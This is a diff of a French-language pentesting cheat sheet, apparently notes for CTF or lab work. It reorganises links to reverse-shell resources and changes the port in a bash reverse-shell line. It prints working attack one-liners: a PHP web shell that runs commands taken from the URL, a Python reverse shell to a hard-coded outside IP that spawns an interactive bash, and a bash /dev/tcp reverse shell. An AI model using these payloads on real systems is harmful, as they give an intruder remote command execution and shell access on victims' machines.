@@ -8,10 +8,11 @@
 
 - Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 	- `<?php system($_GET["cmd"]) ?>`
-	- https://www.revshells.com/
-	- Par internet --> https://dashboard.ngrok.com/get-started/setup
+        - [Simple-PHP-Web-Shell](https://github.com/artyuum/simple-php-web-shell)
+   	
+- https://www.revshells.com/
+- Par internet --> https://dashboard.ngrok.com/get-started/setup
 
-- [Simple-PHP-Web-Shell](https://github.com/artyuum/simple-php-web-shell)
 - [Reverse shell assisté](https://github.com/t0thkr1s/revshellgen)
 - [Liste en plusieurs language Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
 	- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.253.72.139",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
@@ -21,7 +22,7 @@
 
 - [Bypass extension](https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html)
 
-- `bash -i >& /dev/tcp/10.8.218.133/80 0>&1` --> Elévation de privilèges
+- `bash -i >& /dev/tcp/10.8.218.133/1234 0>&1` --> Elévation de privilèges
 
 ### Tools
 
